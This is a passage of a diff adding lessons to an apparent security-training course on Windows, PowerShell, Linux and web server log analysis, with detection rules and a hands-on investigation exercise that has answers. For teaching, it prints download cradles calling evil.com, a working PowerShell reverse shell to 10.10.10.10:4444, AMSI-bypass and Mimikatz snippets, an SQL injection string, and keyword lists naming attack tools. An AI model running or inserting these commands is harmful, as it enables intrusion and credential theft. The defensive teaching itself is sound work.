+- Network connections (Event 3)
+- File creation (Event 11)
+
+## Suspicious Process Patterns
+
+### 1. Living Off the Land Binaries (LOLBins)
+Attackers abuse built-in Windows tools:
+
+| Binary | Suspicious Use |
+|--------|----------------|
+| powershell.exe | Encoded commands, download cradles |
+| cmd.exe | Spawned from unusual parents |
+| wscript.exe | Running remote scripts |
+| mshta.exe | Running HTA files |
+| certutil.exe | Downloading files |
+| bitsadmin.exe | File transfers |
+| regsvr32.exe | Loading remote DLLs |
+
+**Detection Example:**
+\`\`\`
+Process: certutil.exe
+CommandLine: certutil -urlcache -split -f http://evil.com/payload.exe
+\`\`\`
+
+### 2. Suspicious Parent-Child Relationships
+
+**Normal:**
+\`\`\`
+explorer.exe → chrome.exe ✓
+explorer.exe → notepad.exe ✓
+services.exe → svchost.exe ✓
+\`\`\`
+
+**Suspicious:**
+\`\`\`
+outlook.exe → powershell.exe ⚠️ (Macro execution)
+winword.exe → cmd.exe ⚠️ (Macro execution)
+w3wp.exe → cmd.exe ⚠️ (Web shell)
+svchost.exe → cmd.exe ⚠️ (Potentially malicious)
+\`\`\`
+
+### 3. Encoded PowerShell
+
+**Red Flags:**
+\`\`\`
+powershell.exe -enc <base64>
+powershell.exe -e <base64>
+powershell.exe -EncodedCommand <base64>
+powershell.exe -nop -w hidden -c IEX(...)
+\`\`\`
+
+**Decode Base64 to see actual command:**
+\`\`\`bash
+echo "SGVsbG8gV29ybGQ=" | base64 -d
+\`\`\`
+
+### 4. Download Cradles
+
+Commands that download and execute:
+\`\`\`powershell
+# PowerShell
+IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
+Invoke-Expression (Invoke-WebRequest 'http://evil.com/script.ps1')
+
+# Certutil
+certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe
+
+# BITSAdmin
+bitsadmin /transfer job http://evil.com/payload.exe C:\\temp\\payload.exe
+\`\`\`
+
+## Building Detection Rules
+
+### Encoded PowerShell Detection
+\`\`\`
+Process = "powershell.exe" 
+AND CommandLine matches regex "-(e|enc|encodedcommand)\\s+[A-Za-z0-9+/=]{50,}"
+\`\`\`
+
+### Unusual Parent-Child
+\`\`\`
+ParentImage IN (
+  "*\\outlook.exe", 
+  "*\\winword.exe", 
+  "*\\excel.exe"
+) 
+AND Image IN (
+  "*\\powershell.exe", 
+  "*\\cmd.exe", 
+  "*\\wscript.exe"
+)
+\`\`\`
+
+### Certutil Download
+\`\`\`
+Process = "*\\certutil.exe"
+AND CommandLine contains any of ("-urlcache", "-split", "http://", "https://")
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Event 4688 with command-line logging captures process execution",
+      "Sysmon provides richer data including hashes and parent command lines",
+      "Watch for LOLBins (certutil, mshta, bitsadmin) used maliciously",
+      "Unusual parent-child relationships indicate potential compromise",
+      "Encoded PowerShell commands are a major red flag"
+    ]
+  },
+  {
+    id: "2.5",
+    courseId: "log-analysis",
+    title: "PowerShell Logging",
+    content: `
+# PowerShell Logging
+
+PowerShell is both a powerful admin tool and a favorite of attackers. Proper logging is essential for detecting malicious use.
+
+## Types of PowerShell Logging
+
+### 1. Module Logging
+Records pipeline execution details for specified modules.
+
+**Enable via GPO:**
+\`\`\`
+Computer Configuration → Administrative Templates → 
+Windows Components → Windows PowerShell → 
+Turn on Module Logging = Enabled
+Module Names = *  (all modules)
+\`\`\`
+
+**Event Log:** Microsoft-Windows-PowerShell/Operational
+**Event ID:** 4103
+
+### 2. Script Block Logging
+Records the full content of executed scripts.
+
+**Enable via GPO:**
+\`\`\`
+Computer Configuration → Administrative Templates → 
+Windows Components → Windows PowerShell → 
+Turn on PowerShell Script Block Logging = Enabled
+Log script block invocation = Checked (optional)
+\`\`\`
+
+**Event Log:** Microsoft-Windows-PowerShell/Operational
+**Event ID:** 4104
+
+### 3. Transcription Logging
+Creates text transcript of entire PowerShell session.
+
+**Enable via GPO:**
+\`\`\`
+Computer Configuration → Administrative Templates → 
+Windows Components → Windows PowerShell → 
+Turn on PowerShell Transcription = Enabled
+Transcript Output Directory = \\\\server\\share\\transcripts\\
+\`\`\`
+
+**Output:** Text files in specified directory
+
+## Script Block Logging (Event 4104)
+
+This is the most valuable for threat detection.
+
+### Example Event
+
+\`\`\`xml
+<Event>
+  <System>
+    <EventID>4104</EventID>
+    <TimeCreated SystemTime="2023-10-11T22:14:15Z"/>
+  </System>
+  <EventData>
+    <Data Name="MessageNumber">1</Data>
+    <Data Name="MessageTotal">1</Data>
+    <Data Name="ScriptBlockText">
+      $client = New-Object System.Net.WebClient
+      $client.DownloadString("http://evil.com/payload.ps1") | IEX
+    </Data>
+    <Data Name="ScriptBlockId">{guid}</Data>
+    <Data Name="Path">C:\\temp\\malware.ps1</Data>
+  </EventData>
+</Event>
+\`\`\`
+
+### Key Field: ScriptBlockText
+This contains the **actual code** that was executed!
+
+## Malicious PowerShell Patterns
+
+### 1. Download and Execute
+\`\`\`powershell
+# Common patterns
+IEX (New-Object Net.WebClient).DownloadString('http://...')
+Invoke-Expression (Invoke-WebRequest '...')
+IEX (iwr '...')
+\`\`\`
+
+### 2. Encoded Commands
+\`\`\`powershell
+# Base64 encoded
+powershell -enc SGVsbG8gV29ybGQ=
+
+# Decodes to actual command in Event 4104
+\`\`\`
+
+### 3. Obfuscation Techniques
+\`\`\`powershell
+# String concatenation
+$a = "Net."; $b = "WebClient"; $c = New-Object ($a + $b)
+
+# Character replacement
+"IEX" -replace 'X','X'
+
+# Tick marks (backticks)
+I\`E\`X
+
+# Variable substitution
+$DoIt = 'IEX'; & $DoIt (...)
+\`\`\`
+
+### 4. AMSI Bypass Attempts
+\`\`\`powershell
+# Common bypass patterns to watch for
+[Ref].Assembly.GetType('...')
+Add-Type -TypeDefinition '...'
+'AmsiContext', 'amsiSession'
+\`\`\`
+
+### 5. Credential Theft
+\`\`\`powershell
+# Mimikatz
+Invoke-Mimikatz
+sekurlsa::logonpasswords
+
+# Credential dumping
+[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR
+Get-Credential
+\`\`\`
+
+## Detection Queries
+
+### Download Cradles
+\`\`\`
+EventID=4104 
+ScriptBlockText matches regex ".*(DownloadString|DownloadFile|WebClient|Invoke-WebRequest|iwr|wget|curl).*"
+\`\`\`
+
+### Encoded Commands
+\`\`\`
+EventID=4104 
+ScriptBlockText matches regex "FromBase64String|ToBase64String|[Convert]::FromBase64"
+\`\`\`
+
+### AMSI Bypass Attempts
+\`\`\`
+EventID=4104 
+ScriptBlockText matches regex "amsi|AmsiUtils|AmsiContext"
+\`\`\`
+
+### Suspicious Keywords
+\`\`\`
+EventID=4104 
+ScriptBlockText contains any of (
+  "mimikatz",
+  "bloodhound",
+  "powersploit",
+  "empire",
+  "invoke-psexec",
+  "invoke-wmi",
+  "sekurlsa"
+)
+\`\`\`
+
+## Analysis Tips
+
+1. **Large script blocks** may be split across multiple 4104 events (check MessageNumber/MessageTotal)
+
+2. **Decode Base64** in ScriptBlockText to see true commands
+
+3. **Correlate with 4688** to see who ran PowerShell
+
+4. **Check ScriptBlockId** to group related events
+
+5. **Path field** shows if script was file-based or console
+    `,
+    keyTakeaways: [
+      "Enable Script Block Logging (4104) for full visibility into PowerShell",
+      "Event 4104 shows decoded scripts even when encoded on command line",
+      "Watch for download cradles, AMSI bypasses, and obfuscation",
+      "Transcription logging creates full session records",
+      "Correlate PowerShell events with process creation events"
+    ]
+  },
+  {
+    id: "2.6",
+    courseId: "log-analysis",
+    title: "Hands-On: Windows Log Investigation",
+    content: `
+# Hands-On: Windows Log Investigation
+
+Put your Windows log analysis skills to the test! This practical exercise simulates a real investigation scenario.
+
+## Scenario
+
+A security alert triggered on a workstation (WORKSTATION01). Your task is to investigate the Windows Event Logs and determine:
+
+1. Was the system compromised?
+2. What actions did the attacker take?
+3. What IOCs can you extract?
+
+## Sample Log Events
+
+### Event 1: Failed Logon Attempts
+\`\`\`
+Time: 2023-10-11 08:42:15
+EventID: 4625
+Account Name: administrator
+Source IP: 192.168.1.100
+Failure Reason: Bad password
+Logon Type: 3
+\`\`\`
+
+\`\`\`
+Time: 2023-10-11 08:42:16
+EventID: 4625
+Account Name: administrator  
+Source IP: 192.168.1.100
+Failure Reason: Bad password
+Logon Type: 3
+\`\`\`
+*(50 more similar events over 2 minutes)*
+
+### Event 2: Successful Logon
+\`\`\`
+Time: 2023-10-11 08:44:30
+EventID: 4624
+Account Name: administrator
+Source IP: 192.168.1.100
+Logon Type: 3
+Logon Process: NtLmSsp
+\`\`\`
+
+### Event 3: Special Privileges Assigned
+\`\`\`
+Time: 2023-10-11 08:44:31
+EventID: 4672
+Account Name: administrator
+Privileges: SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege
+\`\`\`
+
+### Event 4: Process Creation
+\`\`\`
+Time: 2023-10-11 08:45:00
+EventID: 4688
+New Process: C:\\Windows\\System32\\cmd.exe
+Creator Process: C:\\Windows\\System32\\services.exe
+Command Line: cmd.exe /c whoami
+Account: administrator
+\`\`\`
+
+### Event 5: PowerShell Execution
+\`\`\`
+Time: 2023-10-11 08:45:15
+EventID: 4104
+ScriptBlockText:
+$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+}
+\`\`\`
+
+### Event 6: Scheduled Task Created
+\`\`\`
+Time: 2023-10-11 08:47:00
+EventID: 4698
+Task Name: \\Microsoft\\Windows\\UpdateCheck
+Task Content: cmd.exe /c powershell -ep bypass -f C:\\Windows\\Temp\\update.ps1
+Account: SYSTEM
+\`\`\`
+
+### Event 7: Network Share Access
+\`\`\`
+Time: 2023-10-11 08:50:00
+EventID: 5140
+Account: administrator
+Share Name: \\\\*\\C$
+Source IP: 192.168.1.100
+Access Mask: 0x1
+\`\`\`
+
+## Investigation Questions
+
+Answer these based on the logs above:
+
+### Question 1: Initial Access
+How did the attacker gain access?
+- [ ] A) Phishing email
+- [ ] B) Brute force attack
+- [ ] C) Exploited vulnerability
+- [ ] D) Valid credentials
+
+### Question 2: Attack Type
+The 50+ failed logons followed by success indicates:
+- [ ] A) Normal user forgot password
+- [ ] B) Password spraying
+- [ ] C) Brute force attack
+- [ ] D) Credential stuffing
+
+### Question 3: Malicious Script
+What does the PowerShell script in Event 5 do?
+- [ ] A) Downloads a file
+- [ ] B) Creates a reverse shell
+- [ ] C) Encrypts files
+- [ ] D) Adds a user
+
+### Question 4: Persistence
+How did the attacker establish persistence?
+- [ ] A) Registry run key
+- [ ] B) Scheduled task
+- [ ] C) Service installation
+- [ ] D) Startup folder
+
+### Question 5: C2 Server
+What is the attacker's command and control IP?
+
+Answer: ________________
+
+### Question 6: IOCs
+List all IOCs from this investigation:
+
+- IP Addresses:
+- Hostnames:
+- File Paths:
+- Scheduled Tasks:
+
+## Attack Timeline
+
+\`\`\`
+08:42:15 ─── Brute force begins (50+ attempts)
+    │
+08:44:30 ─── Successful authentication (Type 3)
+    │
+08:44:31 ─── Admin privileges obtained
+    │
+08:45:00 ─── Reconnaissance (whoami)
+    │
+08:45:15 ─── Reverse shell established
+    │
+08:47:00 ─── Persistence via scheduled task
+    │
+08:50:00 ─── Lateral movement (C$ share access)
+\`\`\`
+
+## Answers
+
+1. **B** - Brute force attack (multiple failed then success)
+2. **C** - Brute force (same account, sequential attempts)
+3. **B** - Reverse shell (TCP connection, command execution)
+4. **B** - Scheduled task (Event 4698)
+5. **10.10.10.10** (from PowerShell script)
+6. IOCs:
+   - IPs: 192.168.1.100, 10.10.10.10
+   - Path: C:\\Windows\\Temp\\update.ps1
+   - Task: \\Microsoft\\Windows\\UpdateCheck
+    `,
+    keyTakeaways: [
+      "Multiple 4625 events followed by 4624 indicates brute force success",
+      "Event 4104 reveals malicious scripts even when obfuscated",
+      "4698 events show persistence via scheduled tasks",
+      "5140 events indicate lateral movement via shares",
+      "Building a timeline is critical for understanding the full attack"
+    ],
+    practicalExercise: {
+      title: "Create an Investigation Report",
+      description: "Document this incident as if you were the responding analyst.",
+      steps: [
+        "Write an executive summary",
+        "Create a detailed timeline",
+        "List all IOCs discovered",
+        "Document the attack chain",
+        "Provide recommendations for remediation"
+      ]
+    }
+  },
+  // Module 3: Linux System Logs
+  {
+    id: "3.1",
+    courseId: "log-analysis",
+    title: "Linux Logging Architecture",
+    content: `
+# Linux Logging Architecture
+
+Linux has a robust logging infrastructure that's essential for security monitoring. Understanding this architecture helps you know where to find evidence.
+
+## Linux Logging Overview
+
+\`\`\`
+┌─────────────────────────────────────────────────────────────┐
+│                    Linux Logging Stack                       │
+├─────────────────────────────────────────────────────────────┤
+│  Applications & Services                                     │
+│     ↓                                                        │
+│  syslog() / journald API                                    │
+│     ↓                                                        │
+│  rsyslog / syslog-ng / systemd-journald                     │
+│     ↓                                                        │
+│  /var/log/* or journalctl                                   │
+└─────────────────────────────────────────────────────────────┘
+\`\`\`
+
+## Key Log Locations
+
+### /var/log Directory Structure
+
+| Log File | Purpose |
+|----------|---------|
+| /var/log/auth.log | Authentication events (Debian/Ubuntu) |
+| /var/log/secure | Authentication events (RHEL/CentOS) |
+| /var/log/syslog | General system messages (Debian/Ubuntu) |
+| /var/log/messages | General system messages (RHEL/CentOS) |
+| /var/log/kern.log | Kernel messages |
+| /var/log/cron | Cron job execution |
+| /var/log/maillog | Mail server logs |
+| /var/log/apache2/ | Apache web server |
+| /var/log/nginx/ | Nginx web server |
+| /var/log/audit/ | Linux Audit (auditd) logs |
+
+## Syslog Facilities and Priorities
+
+### Facilities (Sources)
+| Facility | Code | Description |
+|----------|------|-------------|
+| kern | 0 | Kernel messages |
+| user | 1 | User-level messages |
+| mail | 2 | Mail system |
+| daemon | 3 | System daemons |
+| auth | 4 | Security/auth |
+| syslog | 5 | Syslog internal |
+| local0-7 | 16-23 | Custom use |
+
+### Priorities (Severity)
+| Priority | Code | Description |
+|----------|------|-------------|
+| emerg | 0 | System unusable |
+| alert | 1 | Immediate action needed |
+| crit | 2 | Critical conditions |
+| err | 3 | Error conditions |
+| warning | 4 | Warning conditions |
+| notice | 5 | Normal but significant |
+| info | 6 | Informational |
+| debug | 7 | Debug messages |
+
+## systemd-journald
+
+Modern Linux systems use **journald** alongside or instead of traditional syslog.
+
+### journalctl Commands
+
+\`\`\`bash
+# View all logs
+journalctl
+
+# View logs since boot
+journalctl -b
+
+# View logs for specific service
+journalctl -u sshd
+
+# View logs since specific time
+journalctl --since "2023-10-11 08:00:00"
+
+# Follow logs in real-time
+journalctl -f
+
+# Show only errors and above
+journalctl -p err
+
+# View authentication logs
+journalctl -t sshd
+
+# Output as JSON
+journalctl -o json-pretty
+\`\`\`
+
+## rsyslog Configuration
+
+rsyslog is the most common syslog implementation.
+
+### Configuration File: /etc/rsyslog.conf
+
+\`\`\`
+# Log auth messages to auth.log
+auth,authpriv.*    /var/log/auth.log
+
+# Log everything except auth to syslog
+*.*;auth,authpriv.none    /var/log/syslog
+
+# Log kernel messages to kern.log
+kern.*    /var/log/kern.log
+
+# Forward logs to remote server
+*.* @@192.168.1.100:514
+\`\`\`
+
+## Log Rotation
+
+Logs are rotated to manage disk space via **logrotate**.
+
+### Configuration: /etc/logrotate.d/rsyslog
+
+\`\`\`
+/var/log/syslog
+{
+    rotate 7
+    daily
+    missingok
+    notifempty
+    delaycompress
+    compress
+    postrotate
+        /usr/lib/rsyslog/rsyslog-rotate
+    endscript
+}
+\`\`\`
+
+## Linux Audit System (auditd)
+
+**auditd** provides detailed system call auditing.
+
+### Key Files
+- **/etc/audit/auditd.conf** - Daemon configuration
+- **/etc/audit/audit.rules** - Audit rules
+- **/var/log/audit/audit.log** - Audit log
+
+### Common Audit Rules
+
+\`\`\`bash
+# Monitor file access
+-w /etc/passwd -p wa -k identity
+-w /etc/shadow -p wa -k identity
+
+# Monitor command execution
+-a always,exit -F arch=b64 -S execve -k exec
+
+# Monitor network connections
+-a always,exit -F arch=b64 -S connect -k network
+
+# Monitor user/group changes
+-w /etc/group -p wa -k identity
+-w /etc/gshadow -p wa -k identity
+\`\`\`
+
+### Reading Audit Logs
+
+\`\`\`bash
+# Search audit log
+ausearch -k identity
+
+# Generate report
+aureport -au
+
+# Watch specific user
+ausearch -ua username
+\`\`\`
+
+## Useful Commands
+
+\`\`\`bash
+# View last logins
+last
+
+# View failed logins
+lastb
+
+# View currently logged in users
+who
+
+# View login history
+lastlog
+
+# View system uptime and users
+w
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Linux stores logs in /var/log with distribution-specific file names",
+      "auth.log (Debian) or secure (RHEL) contain authentication events",
+      "journalctl is the modern way to query logs on systemd systems",
+      "auditd provides detailed system call auditing for security",
+      "Understanding syslog facilities and priorities helps filter logs"
+    ]
+  },
+  {
+    id: "3.2",
+    courseId: "log-analysis",
+    title: "Authentication Logs (auth.log/secure)",
+    content: `
+# Authentication Logs (auth.log/secure)
+
+Authentication logs are the most security-critical logs on Linux systems. They record all login attempts, sudo usage, and PAM events.
+
+## Log Locations
+
+| Distribution | Auth Log Path |
+|--------------|---------------|
+| Debian/Ubuntu | /var/log/auth.log |
+| RHEL/CentOS/Fedora | /var/log/secure |
+| SUSE | /var/log/messages |
+
+## SSH Authentication Events
+
+### Successful SSH Login
+\`\`\`
+Oct 11 10:15:30 server sshd[12345]: Accepted publickey for john from 192.168.1.100 port 54321 ssh2: RSA SHA256:aBcDeFg...
+Oct 11 10:15:30 server sshd[12345]: pam_unix(sshd:session): session opened for user john by (uid=0)
+\`\`\`
+
+### Failed SSH Login
+\`\`\`
+Oct 11 10:15:30 server sshd[12345]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2
+Oct 11 10:15:31 server sshd[12345]: Connection closed by authenticating user admin 192.168.1.100 port 54321 [preauth]
+\`\`\`
+
+### SSH Brute Force Pattern
+\`\`\`
+Oct 11 10:15:30 server sshd[12345]: Failed password for root from 192.168.1.100 port 54321
+Oct 11 10:15:31 server sshd[12346]: Failed password for root from 192.168.1.100 port 54322
+Oct 11 10:15:32 server sshd[12347]: Failed password for root from 192.168.1.100 port 54323
+Oct 11 10:15:33 server sshd[12348]: Failed password for root from 192.168.1.100 port 54324
+\`\`\`
+
+## Sudo Events
+
+### Successful Sudo
+\`\`\`
+Oct 11 10:20:00 server sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt update
+\`\`\`
+
+### Failed Sudo (Wrong Password)
+\`\`\`
+Oct 11 10:20:00 server sudo: pam_unix(sudo:auth): authentication failure; logname=john uid=1000 euid=0 tty=/dev/pts/0 ruser=john rhost= user=john
+Oct 11 10:20:05 server sudo: john : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+\`\`\`
+
+### Unauthorized Sudo Attempt
+\`\`\`
+Oct 11 10:20:00 server sudo: baduser : user NOT in sudoers ; TTY=pts/0 ; PWD=/home/baduser ; USER=root ; COMMAND=/bin/bash
+\`\`\`
+
+## User Account Events
+
+### User Added
+\`\`\`
+Oct 11 10:25:00 server useradd[12345]: new user: name=newuser, UID=1001, GID=1001, home=/home/newuser, shell=/bin/bash
+\`\`\`
+
+### Password Changed
+\`\`\`
+Oct 11 10:25:30 server passwd[12346]: pam_unix(passwd:chauthtok): password changed for newuser
+\`\`\`
+
+### User Added to Group
+\`\`\`
+Oct 11 10:26:00 server usermod[12347]: add 'newuser' to group 'sudo'
+\`\`\`
+
+## PAM Events
+
+PAM (Pluggable Authentication Modules) logs authentication for all services.
+
+### PAM Success
+\`\`\`
+Oct 11 10:30:00 server sshd[12345]: pam_unix(sshd:session): session opened for user john by (uid=0)
+\`\`\`
+
+### PAM Failure
+\`\`\`
+Oct 11 10:30:00 server sshd[12345]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.1.100 user=john
+\`\`\`
+
+## Detection Patterns
+
+### SSH Brute Force Detection
+\`\`\`bash
+# Count failed logins by IP
+grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
+
+# Find IPs with more than 10 failed attempts
+grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | awk '$1 > 10'
+\`\`\`
+
+### Successful Logins from Unusual IPs
+\`\`\`bash
+# List all successful logins with source IPs
+grep "Accepted" /var/log/auth.log | awk '{print $1, $2, $3, $9, $11}'
+\`\`\`
+
+### Sudo Abuse Detection
+\`\`\`bash
+# Find failed sudo attempts
+grep "authentication failure" /var/log/auth.log | grep sudo
+
+# Find users not in sudoers
+grep "NOT in sudoers" /var/log/auth.log
+\`\`\`
+
+### Unusual Account Activity
+\`\`\`bash
+# New user creation
+grep "useradd" /var/log/auth.log
+
+# Password changes
+grep "password changed" /var/log/auth.log
+
+# Group membership changes
+grep "to group" /var/log/auth.log
+\`\`\`
+
+## Quick Reference: Key Patterns
+
+| Pattern | Indicates |
+|---------|-----------|
+| "Failed password" | Failed login attempt |
+| "Accepted password" | Successful password auth |
+| "Accepted publickey" | Successful key auth |
+| "invalid user" | Login attempt for nonexistent user |
+| "NOT in sudoers" | Unauthorized sudo attempt |
+| "session opened" | Login session started |
+| "session closed" | Logout |
+| "authentication failure" | PAM auth failed |
+    `,
+    keyTakeaways: [
+      "auth.log (Debian) or secure (RHEL) are critical for security monitoring",
+      "'Failed password' entries reveal brute force attempts",
+      "Sudo logs show privilege escalation attempts",
+      "'NOT in sudoers' indicates unauthorized privilege attempts",
+      "PAM logs record authentication across all services"
+    ],
+    practicalExercise: {
+      title: "Auth Log Analysis",
+      description: "Analyze a sample auth.log file for security events.",
+      steps: [
+        "Count total failed SSH logins",
+        "Identify the top 5 source IPs for failed logins",
+        "Find any successful logins after failed attempts",
+        "List all sudo commands run as root",
+        "Identify any new user accounts created"
+      ]
+    }
+  },
+  {
+    id: "3.3",
+    courseId: "log-analysis",
+    title: "System & Application Logs",
+    content: `
+# System & Application Logs
+
+Beyond authentication, Linux logs system events, service activity, and application behavior that are valuable for security analysis.
+
+## System Logs
+
+### /var/log/syslog or /var/log/messages
+
+General system messages from various sources.
+
+\`\`\`
+Oct 11 10:00:00 server systemd[1]: Starting Apache HTTP Server...
+Oct 11 10:00:01 server systemd[1]: Started Apache HTTP Server.
+Oct 11 10:05:00 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=192.168.1.100 DST=10.0.0.1 ...
+\`\`\`
+
+### /var/log/kern.log
+
+Kernel messages including hardware, drivers, and security events.
+
+\`\`\`
+Oct 11 10:00:00 server kernel: [   0.000000] Linux version 5.4.0-42-generic
+Oct 11 10:05:00 server kernel: usb 1-1: new high-speed USB device number 2
+Oct 11 10:10:00 server kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.168.1.100 ...
+\`\`\`
+
+**Security-relevant kernel messages:**
+- UFW/iptables blocks
+- USB device connections
+- Segfaults and crashes
+- OOM killer events
+- SELinux/AppArmor denials
+
+### /var/log/dmesg
+
+Boot-time kernel messages.
+
+\`\`\`bash
+# View boot messages
+dmesg
+
+# View only errors
+dmesg --level=err,warn
+
+# Follow new messages
+dmesg -w
+\`\`\`
+
+## Service-Specific Logs
+
+### Cron Jobs (/var/log/cron)
+
+\`\`\`
+Oct 11 10:00:01 server CRON[12345]: (root) CMD (/usr/local/bin/backup.sh)
+Oct 11 10:00:01 server CRON[12346]: (www-data) CMD (php /var/www/cron.php)
+\`\`\`
+
+**Security concerns:**
+- Unexpected cron jobs (persistence)
+- Jobs running as root
+- Jobs executing from /tmp or unusual paths
+
+### Package Manager Logs
+
+**Debian/Ubuntu:**
+\`\`\`
+# /var/log/dpkg.log
+2023-10-11 10:00:00 install package-name:amd64 <none> 1.0.0
+2023-10-11 10:00:01 status installed package-name:amd64 1.0.0
+\`\`\`
+
+**RHEL/CentOS:**
+\`\`\`
+# /var/log/yum.log or /var/log/dnf.log
+Oct 11 10:00:00 Installed: package-name-1.0.0.x86_64
+\`\`\`
+
+**Security concerns:**
+- Unexpected package installations
+- Security tools being removed
+- Kernel updates
+
+### Boot Logs (/var/log/boot.log)
+
+Services started during boot.
+
+\`\`\`
+Oct 11 10:00:00 server systemd[1]: Starting OpenBSD Secure Shell server...
+Oct 11 10:00:01 server systemd[1]: Started OpenBSD Secure Shell server.
+\`\`\`
+
+## Application Logs
+
+### Mail Logs (/var/log/mail.log)
+
+\`\`\`
+Oct 11 10:00:00 server postfix/smtpd[12345]: connect from unknown[192.168.1.100]
+Oct 11 10:00:01 server postfix/smtpd[12345]: NOQUEUE: reject: RCPT from unknown[192.168.1.100]: 554 5.7.1 <admin@target.com>: Relay access denied
+\`\`\`
+
+**Security concerns:**
+- Spam relay attempts
+- Phishing email sources
+- Unusual sending patterns
+
+### Database Logs
+
+**MySQL:**
+\`\`\`
+# /var/log/mysql/error.log
+2023-10-11T10:00:00.000000Z 0 [Warning] Access denied for user 'root'@'192.168.1.100' (using password: YES)
+\`\`\`
+
+**PostgreSQL:**
+\`\`\`
+# /var/log/postgresql/postgresql-14-main.log
+2023-10-11 10:00:00.000 UTC [12345] FATAL: password authentication failed for user "admin"
+\`\`\`
+
+### Container Logs
+
+**Docker:**
+\`\`\`bash
+# View container logs
+docker logs container_name
+
+# Follow logs
+docker logs -f container_name
+
+# Logs are stored in:
+/var/lib/docker/containers/<container-id>/<container-id>-json.log
+\`\`\`
+
+## Security-Relevant Patterns
+
+### Service Crashes
+\`\`\`
+Oct 11 10:00:00 server kernel: nginx[12345]: segfault at 0 ip 00007f... sp 00007ff...
+Oct 11 10:00:00 server systemd[1]: nginx.service: Main process exited, code=killed, status=11/SEGV
+\`\`\`
+
+### OOM Killer (Out of Memory)
+\`\`\`
+Oct 11 10:00:00 server kernel: Out of memory: Killed process 12345 (java) total-vm:8388608kB
+\`\`\`
+
+### UFW/iptables Blocks
+\`\`\`
+Oct 11 10:00:00 server kernel: [UFW BLOCK] IN=eth0 OUT= MAC=... SRC=192.168.1.100 DST=10.0.0.1 LEN=44 TOS=0x00 PREC=0x00 TTL=243 ID=54321 PROTO=TCP SPT=54321 DPT=22 WINDOW=65535
+\`\`\`
+
+### AppArmor/SELinux Denials
+\`\`\`
+Oct 11 10:00:00 server kernel: audit: type=1400 audit(1633954800.000:100): apparmor="DENIED" operation="open" profile="/usr/sbin/apache2" name="/etc/shadow"
+\`\`\`
+
+## Analysis Commands
+
+\`\`\`bash
+# Find errors in syslog
+grep -i "error\\|fail\\|denied\\|block" /var/log/syslog
+
+# Monitor logs in real-time
+tail -f /var/log/syslog | grep --line-buffered -i "error"
+
+# Find recent service restarts
+journalctl -u "*.service" --since "1 hour ago" | grep -i "start\\|stop"
+
+# View firewall blocks
+grep "UFW BLOCK" /var/log/syslog | awk '{print $12}' | cut -d= -f2 | sort | uniq -c | sort -rn
+\`\`\`
+    `,
+    keyTakeaways: [
+      "syslog/messages contain general system events from multiple sources",
+      "Kernel logs reveal firewall blocks, crashes, and hardware events",
+      "Cron logs can expose persistence mechanisms",
+      "Package manager logs show software installations and removals",
+      "AppArmor/SELinux denials indicate blocked malicious behavior"
+    ]
+  },
+  {
+    id: "3.4",
+    courseId: "log-analysis",
+    title: "Web Server Logs (Apache/Nginx)",
+    content: `
+# Web Server Logs (Apache/Nginx)
+
+Web server logs are essential for detecting web-based attacks, unauthorized access attempts, and reconnaissance activity.
+
+## Apache Log Locations
+
+| Log Type | Default Path |
+|----------|--------------|
+| Access Log | /var/log/apache2/access.log |
+| Error Log | /var/log/apache2/error.log |
+| Virtual Host | /var/log/apache2/vhost-access.log |
+
+## Nginx Log Locations
+
+| Log Type | Default Path |
+|----------|--------------|
+| Access Log | /var/log/nginx/access.log |
+| Error Log | /var/log/nginx/error.log |
+
+## Combined Log Format
+
+Most web servers use the **Combined Log Format**:
+
+\`\`\`
+%h %l %u %t "%r" %>s %b "%{Referer}i" "%{User-Agent}i"
+\`\`\`
+
+### Example Entry
+\`\`\`
+192.168.1.100 - john [11/Oct/2023:10:00:00 +0000] "GET /admin/login.php HTTP/1.1" 200 1234 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+\`\`\`
+
+### Field Breakdown
+
+| Field | Value | Description |
+|-------|-------|-------------|
+| %h | 192.168.1.100 | Client IP address |
+| %l | - | Identity (usually -) |
+| %u | john | Authenticated username |
+| %t | [11/Oct/2023:10:00:00 +0000] | Timestamp |
+| %r | "GET /admin/login.php HTTP/1.1" | Request line |
+| %>s | 200 | HTTP status code |
+| %b | 1234 | Response size in bytes |
+| Referer | https://example.com/ | Referring URL |
+| User-Agent | Mozilla/5.0... | Client browser/tool |
+
+## HTTP Status Codes for Security
+
+| Code | Meaning | Security Relevance |
+|------|---------|-------------------|
+| 200 | OK | Successful request |
+| 301/302 | Redirect | May indicate redirect attacks |
+| 400 | Bad Request | Malformed request, possible attack |
+| 401 | Unauthorized | Authentication required/failed |
+| 403 | Forbidden | Access denied |
+| 404 | Not Found | Scanning for files/directories |
+| 500 | Server Error | Possible exploitation attempt |
+| 503 | Service Unavailable | Overload, possible DDoS |
+
+## Web Attack Patterns
+
+### SQL Injection Attempts
+\`\`\`
+192.168.1.100 - - [11/Oct/2023:10:00:00] "GET /search?q=1' OR '1'='1 HTTP/1.1" 200 ...
